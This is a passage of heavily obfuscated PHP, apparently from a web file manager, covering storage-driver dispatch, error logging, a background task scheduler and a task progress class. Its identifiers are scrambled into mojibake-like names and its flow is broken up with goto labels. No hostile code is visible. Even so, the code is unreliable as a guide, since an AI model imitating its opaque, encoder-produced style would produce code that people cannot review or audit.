×µ¤[711])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($b´Æ‹Ôƒ•ï, $Eãİ† ×µ¤[392]); } goto A§Ò×ìŞŸÏ; Bï“ôÌó‘™: return $Cœô”²Û¢Ù; goto a…‡ ©²ÜÊ; A§Ò×ìŞŸÏ: if ($d“ºÏÓÄ[$Eãİ† ×µ¤[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d“ºÏÓÄ[$Eãİ† ×µ¤[392]]]) { return !1; } $DÅ“£Úè¦Í = $d“ºÏÓÄ[$Eãİ† ×µ¤[1047]]; $Cœô”²Û¢Ù = self::driverGet($d“ºÏÓÄ, $DÅ“£Úè¦Í); goto Bï“ôÌó‘™; a…‡ ©²ÜÊ: } private static function driverGet($EÀÖ‰¯©“, &$EÉß¾ÊÚïô) { goto CÆôšÜ÷Øî; CÆôšÜ÷Øî: $F°ˆ‚ÈÃŒ— =& $_SERVER[Ïº«‚ßèÔˆø]; $e£Ú“îÅ” = $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1048]]; $E­ÊÒ»¢‹Ï = $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[392]]; goto D²Ğâœ†Ù¾; D²Ğâœ†Ù¾: switch ($EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[29]]) { case KodIO::KOD_IO: $aš¸¼Ú‹Ó = self::$driverListSystem[$E­ÊÒ»¢‹Ï]; break; case KodIO::KOD_SOURCE: $EÉß¾ÊÚïô = $E­ÊÒ»¢‹Ï . $EÉß¾ÊÚïô; $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1050], $F°ˆ‚ÈÃŒ—[6] => $EÀÖ‰¯©“); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $e«‰¿´Úµ = $GLOBALS[$F°ˆ‚ÈÃŒ—[1051]]; self::$driverListUser = array_to_keyvalue($e«‰¿´Úµ, $F°ˆ‚ÈÃŒ—[392]); } $aš¸¼Ú‹Ó = self::$driverListUser[$E­ÊÒ»¢‹Ï]; break; case KodIO::KOD_SHARE_LINK: $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1052], $F°ˆ‚ÈÃŒ—[6] => $EÀÖ‰¯©“); $F‚¨š×‰ê = Action($F°ˆ‚ÈÃŒ—[1053])->sharePathInfo($EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[76]]); $EÉß¾ÊÚïô = $F‚¨š×‰ê[$F°ˆ‚ÈÃŒ—[394]]; if (!$F‚¨š×‰ê[$F°ˆ‚ÈÃŒ—[394]]) { $f“ºœéñ‹ = Model($F°ˆ‚ÈÃŒ—[562])->getInfo($F‚¨š×‰ê[$F°ˆ‚ÈÃŒ—[466]]); $EÉß¾ÊÚïô = KodIO::clear($f“ºœéñ‹[$F°ˆ‚ÈÃŒ—[1054]] . $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1047]]); $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[464]] = $f“ºœéñ‹; $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1031]] = $EÉß¾ÊÚïô; $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1055], $F°ˆ‚ÈÃŒ—[6] => $EÀÖ‰¯©“); } break; case KodIO::KOD_SHARE_ITEM: $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1056], $F°ˆ‚ÈÃŒ—[6] => $EÀÖ‰¯©“); $f“ºœéñ‹ = Model($F°ˆ‚ÈÃŒ—[562])->getInfo($EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[392]]); if ($f“ºœéñ‹[$F°ˆ‚ÈÃŒ—[394]] == $F°ˆ‚ÈÃŒ—[495]) { $EÉß¾ÊÚïô = KodIO::clear($f“ºœéñ‹[$F°ˆ‚ÈÃŒ—[1054]] . $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1047]]); $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[464]] = $f“ºœéñ‹; $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1031]] = $EÉß¾ÊÚïô; $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1057], $F°ˆ‚ÈÃŒ—[6] => $EÀÖ‰¯©“); } else { if (!$EÉß¾ÊÚïô) { $EÉß¾ÊÚïô = $f“ºœéñ‹[$F°ˆ‚ÈÃŒ—[394]]; } } break; default: $EÉß¾ÊÚïô = $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[76]]; $aš¸¼Ú‹Ó = array($F°ˆ‚ÈÃŒ—[1049] => $F°ˆ‚ÈÃŒ—[1058]); break; } $bÑÛ…©ã… = $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[76]]; if (!isset(self::$driverCache[$bÑÛ…©ã…])) { $e µ°¨¥İ = strtolower($aš¸¼Ú‹Ó[$F°ˆ‚ÈÃŒ—[94]]); $f¯è³„ = $GLOBALS[$F°ˆ‚ÈÃŒ—[6]][$F°ˆ‚ÈÃŒ—[88]][$F°ˆ‚ÈÃŒ—[783]]; $BÅØÅ´Û©ô = $F°ˆ‚ÈÃŒ—[72] . (isset($f¯è³„[$e µ°¨¥İ]) ? $f¯è³„[$e µ°¨¥İ] : ucfirst($e µ°¨¥İ)); if (!class_exists($BÅØÅ´Û©ô)) { show_json("{$BÅØÅ´Û©ô}\x20\156\157\164\x20\145\170\151\163\164\163\x21", !1); } $b‘ç÷Ú–®² = isset($aš¸¼Ú‹Ó[$F°ˆ‚ÈÃŒ—[6]]) ? $aš¸¼Ú‹Ó[$F°ˆ‚ÈÃŒ—[6]] : !1; self::$driverCache[$bÑÛ…©ã…] = new $BÅØÅ´Û©ô($b‘ç÷Ú–®²); } goto eÁ±ËîÙßã; bê‘¿…×¿Ù: if (isset($aš¸¼Ú‹Ó[$F°ˆ‚ÈÃŒ—[6]][$F°ˆ‚ÈÃŒ—[1059]])) { $AÏ˜…ŸÁ¼È->pathBase = rtrim($aš¸¼Ú‹Ó[$F°ˆ‚ÈÃŒ—[6]][$F°ˆ‚ÈÃŒ—[1059]], $F°ˆ‚ÈÃŒ—[8]) . $F°ˆ‚ÈÃŒ—[8]; $EÉß¾ÊÚïô = $AÏ˜…ŸÁ¼È->pathBase . ltrim($EÉß¾ÊÚïô, $F°ˆ‚ÈÃŒ—[8]); } $EÉß¾ÊÚïô = $AÏ˜…ŸÁ¼È->getPath($EÉß¾ÊÚïô); if (isset($EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1031]])) { $EÉß¾ÊÚïô = $EÀÖ‰¯©“[$F°ˆ‚ÈÃŒ—[1031]]; } goto cæ¢Œ„âˆ²; cæ¢Œ„âˆ²: $AÏ˜…ŸÁ¼È->path = $EÉß¾ÊÚïô; return $AÏ˜…ŸÁ¼È; goto C‹®äïè£ß; eÁ±ËîÙßã: $AÏ˜…ŸÁ¼È = self::$driverCache[$bÑÛ…©ã…]; $AÏ˜…ŸÁ¼È->pathDriver = $e£Ú“îÅ”; $AÏ˜…ŸÁ¼È->pathBase = $F°ˆ‚ÈÃŒ—[33]; goto bê‘¿…×¿Ù; C‹®äïè£ß: } public static function errorTips($eáÏØ¥—Û  = false) { goto eß×–íÄ‚; B„ƒèöôø: if ($eáÏØ¥—Û  === -1) { return $AÃª¬ğÉí ? $AÃª¬ğÉí[count($AÃª¬ğÉí) - 1] : $e¡³òÔ—Ñ[33]; } if ($eáÏØ¥—Û  === !1) { return implode($e¡³òÔ—Ñ[228], $AÃª¬ğÉí); } if (count($AÃª¬ğÉí) >= $a¿©®ÙĞÖ) { $AÃª¬ğÉí = array_slice($AÃª¬ğÉí, $a¿©®ÙĞÖ * 0.5, $a¿©®ÙĞÖ); } goto b“¹ìçÀ²; eß×–íÄ‚: $e¡³òÔ—Ñ =& $_SERVER[Ïº«‚ßèÔˆø]; static $AÃª¬ğÉí = array(); $a¿©®ÙĞÖ = 1000; goto B„ƒèöôø; b“¹ìçÀ²: $AÃª¬ğÉí[] = $eáÏØ¥—Û ; write_log($e¡³òÔ—Ñ[160] . ACTION . $e¡³òÔ—Ñ[1060] . $eáÏØ¥—Û , $e¡³òÔ—Ñ[1061]); goto e“š²ÌÇ†…; e“š²ÌÇ†…: } public static function getLastError($fËÏ˜ÚÂöÔ = '') { $aÈ¸»Õ¤ = self::errorTips(-1); return $aÈ¸»Õ¤ ? $aÈ¸»Õ¤ : $fËÏ˜ÚÂöÔ; } } goto e÷•Üì¶§Ô; eùÇ—ò¦’„: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto Aí½–Ü´ŸÚ; Aí½–Ü´ŸÚ: $DÏç‹ì¾…· =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::valueGet($DÏç‹ì¾…·[697]) != $DÏç‹ì¾…·[87]) { return; } if (self::valueGet($DÏç‹ì¾…·[1472]) == $DÏç‹ì¾…·[87]) { $cÄ¯ÀïØ® = self::valueGet($DÏç‹ì¾…·[1473]); if (time() - $cÄ¯ÀïØ® > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto A‹¡–­ÂÊ; d¹ò¦Ù†‰Û: while (!0) { self::cacheClear(); if (self::valueGet($DÏç‹ì¾…·[697]) != $DÏç‹ì¾…·[87]) { self::valueSet($DÏç‹ì¾…·[1472], $DÏç‹ì¾…·[495]); self::log($DÏç‹ì¾…·[1476]); die; } self::valueSet($DÏç‹ì¾…·[1472], $DÏç‹ì¾…·[87]); self::valueSet($DÏç‹ì¾…·[1473], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto A—é¾Ö™¬ò; A‹¡–­ÂÊ: http_close(); self::valueSet($DÏç‹ì¾…·[1472], $DÏç‹ì¾…·[87]); Hook::bind($DÏç‹ì¾…·[1474], $DÏç‹ì¾…·[1475]); goto d¹ò¦Ù†‰Û; A—é¾Ö™¬ò: } public static function restart() { $E•Ñùàğªó =& $_SERVER[Ïº«‚ßèÔˆø]; http_close(); self::valueSet($E•Ñùàğªó[697], $E•Ñùàğªó[495]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($E•Ñùàğªó[1472], $E•Ñùàğªó[495]); self::valueSet($E•Ñùàğªó[697], $E•Ñùàğªó[87]); } public static function shutdownEvent() { $dº¯ÂÑêÂ =& $_SERVER[Ïº«‚ßèÔˆø]; self::valueSet($dº¯ÂÑêÂ[1472], $dº¯ÂÑêÂ[495]); self::log($dº¯ÂÑêÂ[1477]); } public static function config($C³†ÄŠ•¹, $f´‰¾Í¥») { self::valueSet($_SERVER[Ïº«‚ßèÔˆø][697], $C³†ÄŠ•¹); } private static function taskRunAll() { goto cÉº§ƒª—‘; Cœ­Ö©º³Ì: $CÓ‹ô´Ç£ = count($bôŸ ¢Åæ); for ($E…©»Ìç’Å = 0; $E…©»Ìç’Å < $CÓ‹ô´Ç£; $E…©»Ìç’Å++) { $EÎ”×¬£õê = $bôŸ ¢Åæ[$E…©»Ìç’Å]; if (!$EÎ”×¬£õê[$dçÔß«ÊŞê[392]] || $EÎ”×¬£õê[$dçÔß«ÊŞê[1479]] != $dçÔß«ÊŞê[87]) { continue; } if (!self::taskTimeCheck($EÎ”×¬£õê)) { continue; } self::taskRun($EÎ”×¬£õê); } Hook::trigger($dçÔß«ÊŞê[1480]); goto aÁšËï›š; cÉº§ƒª—‘: $dçÔß«ÊŞê =& $_SERVER[Ïº«‚ßèÔˆø]; $A ÕÄäùçç = timeFloat(); $bôŸ ¢Åæ = Model($dçÔß«ÊŞê[1478])->listData(); goto Cœ­Ö©º³Ì; aÁšËï›š: self::taskQueueRun($A ÕÄäùçç); self::closeDatabase(); goto B…£‰ñÅÌ; B…£‰ñÅÌ: } private static function taskQueueRun($A„¿§ö„Ä‹) { $cÖåäô¸›„ = 10; while (!0) { $E–‰‡ß±¼ = TaskQueue::run(); if ($E–‰‡ß±¼ === !1) { break; } if (timeFloat() - $A„¿§ö„Ä‹ >= $cÖåäô¸›„) { break; } } } private static function taskTimeCheck($EÙ»ôİ…ö) { goto e¯µÚ§ÛÕ; e¯µÚ§ÛÕ: $E”«¾Âã’ =& $_SERVER[Ïº«‚ßèÔˆø]; $a¿›å¤ÒÇ = json_decode($EÙ»ôİ…ö[$E”«¾Âã’[196]], !0); $d˜÷®±ª£ = intval($EÙ»ôİ…ö[$E”«¾Âã’[1473]]); goto föé» ¿ø«; D“„„Î‡: switch ($a¿›å¤ÒÇ[$E”«¾Âã’[29]]) { case $E”«¾Âã’[1487]: if (time() - $d˜÷®±ª£ < 3600 * 24 * 30) { return !1; } if ($a¿›å¤ÒÇ[$E”«¾Âã’[1487]] == date($E”«¾Âã’[1488]) && $F…·ËŸçÈ›) { return !0; } break; case $E”«¾Âã’[1489]: if (time() - $d˜÷®±ª£ < 3600 * 24 * 7) { return !1; } $dÃĞ™İ²¾‹ = date($E”«¾Âã’[1490]) == 0 ? 7 : date($E”«¾Âã’[1490]); if ($a¿›å¤ÒÇ[$E”«¾Âã’[1489]] == $dÃĞ™İ²¾‹ && $F…·ËŸçÈ›) { return !0; } break; case $E”«¾Âã’[1482]: if (time() - $d˜÷®±ª£ < 3600 * 24) { return !1; } if ($F…·ËŸçÈ›) { return !0; } break; case $E”«¾Âã’[1491]: if (time() - $d˜÷®±ª£ >= floatval($a¿›å¤ÒÇ[$E”«¾Âã’[1491]]) * 60) { return !0; } break; default: break; } return !1; goto eò¸®êÂ¾; föé» ¿ø«: $BŠÈŸœ²‚Œ = strtotime($E”«¾Âã’[1481] . $a¿›å¤ÒÇ[$E”«¾Âã’[1482]] . $E”«¾Âã’[1483]) - strtotime($E”«¾Âã’[1484]); $E‹™¿Ò®™ã = time() - strtotime(date($E”«¾Âã’[1485]) . $E”«¾Âã’[1486]); $F…·ËŸçÈ› = $E‹™¿Ò®™ã >= $BŠÈŸœ²‚Œ && $E‹™¿Ò®™ã <= $BŠÈŸœ²‚Œ + 3600; goto D“„„Î‡; eò¸®êÂ¾: } private static function closeDatabase() { goto D«‡©ÍˆøÆ; d¶½ ‰ôÌ: if (!$aö‡’ÛŠÏ») { $aö‡’ÛŠÏ» = time(); } if (time() - $aö‡’ÛŠÏ» < $A”»£÷ ) { return; } $aö‡’ÛŠÏ» = time(); goto Dµ‰¤Ê÷ºÖ; D«‡©ÍˆøÆ: $c½„›Å»›Á =& $_SERVER[Ïº«‚ßèÔˆø]; static $aö‡’ÛŠÏ» = 0; $A”»£÷  = 1800; goto d¶½ ‰ôÌ; Dµ‰¤Ê÷ºÖ: $eµ´Œ¶¼Äà = Model($c½„›Å»›Á[501])->db($c½„›Å»›Á[33]); if ($eµ´Œ¶¼Äà) { $eµ´Œ¶¼Äà->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($c½„›Å»›Á[1492], $c½„›Å»›Á[1493]); die; } goto e–­Ò†“ç; e–­Ò†“ç: } public static function taskRun($f¶ä¨©œÉß) { goto cğÙÒÑêÉª; d–âçÜ­ø: Model($c™‚Åä°ƒ[1498])->add(array($c™‚Åä°ƒ[1499] => $c™‚Åä°ƒ[33], $c™‚Åä°ƒ[1500] => $c™‚Åä°ƒ[495], $c™‚Åä°ƒ[29] => $c™‚Åä°ƒ[1501] . $f¶ä¨©œÉß[$c™‚Åä°ƒ[392]], $c™‚Åä°ƒ[1502] => json_encode(array($c™‚Åä°ƒ[28] => $f¶ä¨©œÉß[$c™‚Åä°ƒ[28]], $c™‚Åä°ƒ[1503] => timeFloat() - $aĞàõÓøİ†, $c™‚Åä°ƒ[290] => $dèÜËç˜Œ)))); self::log($c™‚Åä°ƒ[1504] . $f¶ä¨©œÉß[$c™‚Åä°ƒ[392]] . $c™‚Åä°ƒ[1505] . $dèÜËç˜Œ); return !0; goto Böï‘Ò ó„; FˆÉŠíÃÄö: $aĞàõÓøİ† = timeFloat(); $dèÜËç˜Œ = $c™‚Åä°ƒ[33]; switch ($f¶ä¨©œÉß[$c™‚Åä°ƒ[29]]) { case $c™‚Åä°ƒ[304]: $dÉŞ¸ãÁêˆ = url_request($f¶ä¨©œÉß[$c™‚Åä°ƒ[1497]], $c™‚Åä°ƒ[227], !1, !1, !1, !1, 5); $dèÜËç˜Œ = strlen($dÉŞ¸ãÁêˆ); break; case $c™‚Åä°ƒ[226]: $dèÜËç˜Œ = Hook::apply($f¶ä¨©œÉß[$c™‚Åä°ƒ[1497]]); default: break; } goto d–âçÜ­ø; cğÙÒÑêÉª: $c™‚Åä°ƒ =& $_SERVER[Ïº«‚ßèÔˆø]; self::log($c™‚Åä°ƒ[1494] . $f¶ä¨©œÉß[$c™‚Åä°ƒ[392]] . $c™‚Åä°ƒ[1495] . $f¶ä¨©œÉß[$c™‚Åä°ƒ[28]] . $c™‚Åä°ƒ[1496] . $f¶ä¨©œÉß[$c™‚Åä°ƒ[1497]]); Model($c™‚Åä°ƒ[1478])->run($f¶ä¨©œÉß[$c™‚Åä°ƒ[392]]); goto FˆÉŠíÃÄö; Böï‘Ò ó„: } private static function valueGet($Fæ•«ë£»î) { $d•ËŞôÈÆğ =& $_SERVER[Ïº«‚ßèÔˆø]; $C“¬ğˆ§œ¾ = $d•ËŞôÈÆğ[1506]; $F•ßÖƒË» = Model($d•ËŞôÈÆğ[1507])->get($Fæ•«ë£»î, $C“¬ğˆ§œ¾); if (is_null($F•ßÖƒË»)) { Model($d•ËŞôÈÆğ[1507])->set($d•ËŞôÈÆğ[697], $d•ËŞôÈÆğ[87], $C“¬ğˆ§œ¾); Model($d•ËŞôÈÆğ[1507])->set($d•ËŞôÈÆğ[1472], $d•ËŞôÈÆğ[495], $C“¬ğˆ§œ¾); $F•ßÖƒË» = Model($d•ËŞôÈÆğ[1507])->get($Fæ•«ë£»î, $C“¬ğˆ§œ¾); } return $F•ßÖƒË»; } private static function valueSet($a˜Íù´Ïœî, $E¬¾¯º¢­Ş) { $eÒøãÛ± =& $_SERVER[Ïº«‚ßèÔˆø]; return Model($eÒøãÛ±[1507])->set($a˜Íù´Ïœî, $E¬¾¯º¢­Ş, $eÒøãÛ±[1506]); } protected static function log($fß½–ˆŒŞå) { write_log($fß½–ˆŒŞå, $_SERVER[Ïº«‚ßèÔˆø][1493]); } private static function cacheClear() { $b¥‘ç­°Ö¸ =& $_SERVER[Ïº«‚ßèÔˆø]; $AÊŞÙÚˆó = Model($b¥‘ç­°Ö¸[1507])->cacheKey($b¥‘ç­°Ö¸[1506]); Cache::clearMemory($AÊŞÙÚˆó); Model($b¥‘ç­°Ö¸[1478])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($cÎ…¢­, $fÁºÚÃºÚÍ = '', $E„¼Ç¡Šó¾ = 0, $cÂ¿¾À = '') { goto C°…Æ„Å¶¶; A×‰Æ®õÊğ: $GLOBALS[$A„¸å‰à•[1514]] = 1; Hook::bind($A„¸å‰à•[1474], array($this, $A„¸å‰à•[1515])); Hook::bind($A„¸å‰à•[1516], array($this, $A„¸å‰à•[1517])); goto DÂ‡²Ú³‘Ç; C°…Æ„Å¶¶: $A„¸å‰à• =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::get($cÎ…¢­)) { return; } $this->task = array($A„¸å‰à•[392] => $cÎ…¢­, $A„¸å‰à•[1508] => USER_ID, $A„¸å‰à•[1414] => $cÂ¿¾À, $A„¸å‰à•[29] => $fÁºÚÃºÚÍ, $A„¸å‰à•[1007] => $A„¸å‰à•[33], $A„¸å‰à•[1005] => $E„¼Ç¡Šó¾, $A„¸å‰à•[1019] => 0, $A„¸å‰à•[1509] => 0, $A„¸å‰à•[1510] => 0, $A„¸å‰à•[733] => timeFloat(), $A„¸å‰à•[732] => 0, $A„¸å‰à•[1511] => 0, $A„¸å‰à•[1512] => 0, $A„¸å‰à•[1513] => 0, $A„¸å‰à•[697] => $A„¸å‰à•[1472]); goto A×‰Æ®õÊğ; DÂ‡²Ú³‘Ç: $this->startAfter(); Hook::trigger($A„¸å‰à•[1518], $this->task); $this->task[$A„¸å‰à•[1511]] = timeFloat(); goto B“¥ùë»öÇ; B“¥ùë»öÇ: } public function end() { goto a‡ƒº³Š×Æ; fÙòÚ›º¥•: $C»Ä¼ÓØ·à = timeFloat() - $this->task[$Aö‘Ï¹åèÒ[733]]; self::log($Aö‘Ï¹åèÒ[1519] . $this->task[$Aö‘Ï¹åèÒ[392]] . $Aö‘Ï¹åèÒ[1520] . $C»Ä¼ÓØ·à . $Aö‘Ï¹åèÒ[1521]); Hook::unbind($Aö‘Ï¹åèÒ[1474], array($this, $Aö‘Ï¹åèÒ[1515])); goto b™ê²ÃÄì¯; b™ê²ÃÄì¯: Hook::unbind($Aö‘Ï¹åèÒ[1516], array($this, $Aö‘Ï¹åèÒ[1517])); $this->endAfter(); $this->task = !1; goto d×¢ÏÇµ•Ü; a‡ƒº³Š×Æ: $Aö‘Ï¹åèÒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->task) { return; } if ($this->task[$Aö‘Ï¹åèÒ[1511]]) { self::valueSet($this->task[$Aö‘Ï¹åèÒ[392]], !1); } goto fÙòÚ›º¥•; d×¢ÏÇµ•Ü: } public function update($eÅ·©İ–„ = 0, $DµõÚÈæË“ = false) { goto BÎ í ‡; b†…´à‘Íó: $this->updateAfter(); $BŠ…÷ãâ•ô = 0.2; if (timeFloat() - $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1511]] < $BŠ…÷ãâ•ô && !$DµõÚÈæË“) { return; } goto fìô“˜±òÚ; eïÜçÙ¬Æ¹: Hook::trigger($D˜íŞ¸ÖßÈ[1525], $FÂî±äÏá¹); self::valueSet($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[392]], $FÂî±äÏá¹); goto cÊ—”ĞªÆ; BÎ í ‡: $D˜íŞ¸ÖßÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $FÂî±äÏá¹ =& $this->task; if (!$FÂî±äÏá¹) { return; } goto AÄèÑ­ƒµ; AÄèÑ­ƒµ: $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1019]] += $eÅ·©İ–„; $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[732]] = timeFloat(); if ($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1005]]) { if ($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1005]] < $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1019]]) { $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1005]] = $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1019]]; } $Aê•µ˜‡ìÜ = timeFloat() - $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[733]] - $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1512]]; $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1509]] = $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1019]] / $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1005]]; $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1510]] = $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1019]] / $Aê•µ˜‡ìÜ; if ($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1509]] > 0) { $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1513]] = $Aê•µ˜‡ìÜ * (1 - $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1509]]) / $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1509]]; } $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1513]] = $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1513]] <= 0 ? 0 : $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1513]]; } goto b†…´à‘Íó; fìô“˜±òÚ: $BöŒ›´¬ëé = self::get($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[392]]); $c•ô ½÷® = $BöŒ›´¬ëé[$D˜íŞ¸ÖßÈ[697]]; if ($c•ô ½÷® == self::STATYS_KILL) { $eà¨µˆ¸ë¦ = array($D˜íŞ¸ÖßÈ[1522] => LNG($D˜íŞ¸ÖßÈ[1523]), $D˜íŞ¸ÖßÈ[1069] => !1); Cache::set($D˜íŞ¸ÖßÈ[1524] . $this->task[$D˜íŞ¸ÖßÈ[392]], $eà¨µˆ¸ë¦, 30); $this->end(); die; } else { if ($c•ô ½÷® == self::STATYS_STOP) { $FéŠ¶“ê½ = 2; $BöŒ›´¬ëé[$D˜íŞ¸ÖßÈ[1512]] += $FéŠ¶“ê½; self::valueSet($FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[392]], $BöŒ›´¬ëé); sleep($FéŠ¶“ê½); $this->update(); return; } } goto F¶ç–Ó÷™; F¶ç–Ó÷™: $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[697]] = $c•ô ½÷® ? $c•ô ½÷® : $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[697]]; $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1512]] = $BöŒ›´¬ëé[$D˜íŞ¸ÖßÈ[1512]] ? $BöŒ›´¬ëé[$D˜íŞ¸ÖßÈ[1512]] : 0; $FÂî±äÏá¹[$D˜íŞ¸ÖßÈ[1511]] = timeFloat(); goto eïÜçÙ¬Æ¹; cÊ—”ĞªÆ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Cé„ÅšÂ¹ø) { $cùéÊšßµ« =& $_SERVER[Ïº«‚ßèÔˆø]; Cache::set($cùéÊšßµ«[1524] . $this->task[$cùéÊšßµ«[392]], $Cé„ÅšÂ¹ø, 60); return $Cé„ÅšÂ¹ø; } public static function get($cÀŸ¶‹¼­ƒ) { return self::valueGet($cÀŸ¶‹¼­ƒ); } public static function listData() { $C¯ó¢…ºë¡ = self::valueGet(); return array_sort_by($C¯ó¢…ºë¡, $_SERVER[Ïº«‚ßèÔˆø][733], !0); } public static function kill($FñÉÅäåÖ) { return self::changeStatus($FñÉÅäåÖ, self::STATYS_KILL); } public static function stop($B´™ª‹È¢) { return self::changeStatus($B´™ª‹È¢, self::STATYS_STOP); } public static function restart($fÕƒÊ¶«í) { return self::changeStatus($fÕƒÊ¶«í, self::STATYS_RUNNING); } public static function killAll() { $A²Á…Ğ‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $c¾†»¥ÚÂì = self::listData(); foreach ($c¾†»¥ÚÂì as $CÃØ¤ä“á‰) { self::kill($CÃØ¤ä“á‰[$A²Á…Ğ‘[392]]); } sleep(2); foreach ($c¾†»¥ÚÂì as $CÃØ¤ä“á‰) { self::valueSet($CÃØ¤ä“á‰[$A²Á…Ğ‘[392]], !1); } } private static function changeStatus($eÕ‚ğË›è–, $B—Ç”‡‘) { goto Eò÷ùçˆŞÛ; b–Ü‘…Û„™: return !0; goto Fê®õì·æ; Eò÷ùçˆŞÛ: $CéƒÎí¸“í =& $_SERVER[Ïº«‚ßèÔˆø]; $fò±è™¼¶Ş = self::valueGet($eÕ‚ğË›è–); if (!$fò±è™¼¶Ş) { return !1; } goto f•½ì¾¼Â´; f•½ì¾¼Â´: $fò±è™¼¶Ş[$CéƒÎí¸“í[697]] = $B—Ç”‡‘; self::valueSet($eÕ‚ğË›è–, $fò±è™¼¶Ş); self::log($CéƒÎí¸“í[1526] . $fò±è™¼¶Ş[$CéƒÎí¸“í[392]] . $CéƒÎí¸“í[1527] . $B—Ç”‡‘); goto b–Ü‘…Û„™; Fê®õì·æ: } public static function valueGet($e®ªƒÑô‰ = false) { $EÎÑ­¹…‘° =& $_SERVER[Ïº«‚ßèÔˆø]; if ($e®ªƒÑô‰) { $A Ö•Âùê = Model($EÎÑ­¹…‘°[423])->where(array($EÎÑ­¹…‘°[93] => $e®ªƒÑô‰, $EÎÑ­¹…‘°[29] => $EÎÑ­¹…‘°[1528]))->find(); return $A Ö•Âùê ? json_decode($A Ö•Âùê[$EÎÑ­¹…‘°[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($d”ïÚ²Óß = false) { goto B¬¶»«ÜËÓ; BÚâ…Â÷Œ…: $eŠç–°—Ç¨ = Model($AŞµ«™ÎÀâ[423])->where($aøêğÓ¥°’)->select(); $eŠç–°—Ç¨ = $eŠç–°—Ç¨ ? $eŠç–°—Ç¨ : array(); foreach ($eŠç–°—Ç¨ as $dÈ™¿î”ÌØ => $AØèîƒÕ©) { $eŠç–°—Ç¨[$dÈ™¿î”ÌØ] = json_decode($AØèîƒÕ©[$AŞµ«™ÎÀâ[371]], !0); } goto Bí¯‹á¹ÅÅ; B¬¶»«ÜËÓ: $AŞµ«™ÎÀâ =& $_SERVER[Ïº«‚ßèÔˆø]; $aøêğÓ¥°’ = array($AŞµ«™ÎÀâ[29] => $AŞµ«™ÎÀâ[1528]); if ($d”ïÚ²Óß) { $aøêğÓ¥°’[$AŞµ«™ÎÀâ[1508]] = $d”ïÚ²Óß; } goto BÚâ…Â÷Œ…; Bí¯‹á¹ÅÅ: return $eŠç–°—Ç¨; goto d§‡É°Ëª; d§‡É°Ëª: } public static function valueSet($dâ”‚æ¤ ¹, $DÎ¯º¡Ê¿Û) { goto c†¢Ã¿ó¯; bÔ½Àæ¨°: if (!$b Üœíˆ¾») { ob_start(); var_dump($DÎ¯º¡Ê¿Û); $dÚÙƒë×â = ob_get_clean(); 